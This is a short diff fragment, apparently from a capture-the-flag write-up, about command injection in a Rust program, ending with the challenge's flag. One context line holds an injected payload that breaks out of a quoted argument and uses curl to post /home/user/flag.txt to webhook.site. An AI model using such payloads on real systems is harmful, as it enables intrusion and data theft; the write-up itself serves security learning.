@@ -68,6 +68,6 @@ One last step from `/home/user/flag.txt`
 "; curl -X POST -d "$(cat /home/user/flag.txt)" https://webhook.site; echo "
 ```
 
-```
+```flag
 vsctf{1s_1t_tru3_wh3n_rust_h4s_c0mm4nd_1nj3ct10n!??}
 ```
